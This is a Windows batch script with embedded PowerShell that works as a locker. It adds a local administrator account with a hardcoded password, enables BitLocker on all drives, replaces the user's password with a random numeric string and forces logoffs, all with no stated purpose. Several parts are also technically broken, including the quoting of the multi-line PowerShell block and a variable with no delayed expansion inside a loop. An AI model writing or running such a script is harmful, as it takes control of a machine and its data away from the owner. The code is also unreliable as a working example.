@echo off
:: Check if running as admin
openfiles >nul 2>&1 || (echo Please run as administrator && exit /b)

:: Convert Microsoft account to local account if necessary
echo Checking if the current account is a Microsoft account...

powershell -command "if ((Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:UserName }).LocalAccount -eq $false) {
    Write-Host 'Converting Microsoft account to local account...'
    $newLocalUsername = $env:UserName
    $newLocalPassword = 'TemporaryPassword123!'
    $localUsername = $newLocalUsername + '_local'
    $localAccountCreated = New-LocalUser -Name $localUsername -Password (ConvertTo-SecureString $newLocalPassword -AsPlainText -Force) -PasswordNeverExpires -UserMayNotChangePassword
    Add-LocalGroupMember -Group 'Administrators' -Member $localUsername
    Invoke-Expression 'shutdown /l /f'
    Start-Sleep -Seconds 10
    Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command { Rename-LocalUser -Name $localUsername -NewName $newLocalUsername }\" -Wait
} else {
    Write-Host 'Account is already a local account.'
}"

:: Re-run the script as a local account
if not exist "%~dp0runaslocal.txt" (
    copy "%~f0" "%~dp0runaslocal.bat"
    echo :: Running as local account >> "%~dp0runaslocal.bat"
    echo runas /user:%username% "%~dp0runaslocal.bat" >> "%~dp0runaslocal.bat"
    echo. > "%~dp0runaslocal.txt"
    "%~dp0runaslocal.bat"
    exit /b
)

:: Enable BitLocker on all drives
for /f "tokens=2 delims=:" %%i in ('wmic logicaldisk get caption ^| find ":"') do (
    echo Enabling BitLocker on drive %%i
    set "drive=%%i:"
    set "recoveryKeyFile=C:\BitLockerRecoveryKey_%%i.txt"
    manage-bde -on %%i: -recoverypassword -RecoveryKey %recoveryKeyFile%
    echo Recovery key for drive %%i: saved to %recoveryKeyFile%
)

:: Change user password to a random string of numbers
setlocal enabledelayedexpansion
set "newpass="
for /L %%i in (1,1,10) do (
    set /A num=!random!%%10
    set "newpass=!newpass!!num!"
)
echo New password: !newpass!

:: Change the current user's password
net user %username% !newpass!

echo Operation completed.

:: Force logout the user, closing any open programs
shutdown /l /f

pause
